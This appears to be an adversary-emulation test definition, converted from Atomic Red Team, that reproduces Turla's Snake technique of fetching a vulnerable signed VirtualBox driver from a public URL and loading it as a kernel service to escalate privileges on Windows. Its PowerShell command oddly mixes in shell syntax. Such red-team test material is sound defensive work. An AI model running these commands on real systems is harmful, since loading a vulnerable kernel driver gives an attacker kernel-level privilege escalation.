- id: 97f621a5-851c-484f-b784-4a9c475006ec
  name: Turla Snake Malware Privilege Escalation Through VM Driver
  description: 'Observed TTP of threat actor Turla in their malware Snake, where a
    an older, legitimate, cryptographically signed

    VirtualBox driver with a known vulnerability is downloaded and run to escalate
    privileges


    Reference: https://unit42.paloaltonetworks.com/turla-pensive-ursa-threat-assessment/'
  tactic: privilege-escalation
  technique:
    attack_id: T1068
    name: Exploitation for Privilege Escalation
  platforms:
    windows:
      psh:
        command: 'if(Test-Path "PathToAtomicsFolder\..\ExternalPayloads\vboxdrv.sys")
          {; exit 0; } else {; exit 1; }; then : ; else $parentpath = Split-Path "PathToAtomicsFolder\..\ExternalPayloads\vboxdrv.sys";
          New-Item -Type Directory $parentpath -ErrorAction Ignore -Force | Out-Null;
          $DriverURL = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/eaea9ccb40c82af8f3867cd0f4dd5e9d.bin";
          Invoke-WebRequest -Uri $DriverURL -OutFile "PathToAtomicsFolder\..\ExternalPayloads\vboxdrv.sys";
          fi; sc.exe create vboxdrv.sys binPath="PathToAtomicsFolder\..\ExternalPayloads\vboxdrv.sys"
          type=kernel; sc.exe start vboxdrv.sys'
        cleanup: sc.exe stop vboxdrv.sys; sc.exe delete vboxdrv.sys; Remove-Item -Recurse
          "#{driver_path}" -ErrorAction Ignore
        elevation_required: true
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - privilege-escalation
  - t1068
  - atomic-red-team
  author: Atomic Red Team
  additional_info:
    input_arguments:
      driver_path:
        description: Path to vulnerable driver
        type: path
        default: PathToAtomicsFolder\..\ExternalPayloads\vboxdrv.sys
    dependencies:
    - description: 'Driver must exist on disk at the specified location (#{driver_path})

        '
      prereq_command: "if(Test-Path \"#{driver_path}\") {\n    exit 0\n} else {\n\
        \    exit 1\n}\n"
      get_prereq_command: '$parentpath = Split-Path "#{driver_path}"

        New-Item -Type Directory $parentpath -ErrorAction Ignore -Force | Out-Null

        $DriverURL = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/eaea9ccb40c82af8f3867cd0f4dd5e9d.bin"

        Invoke-WebRequest -Uri $DriverURL -OutFile "#{driver_path}"

        '
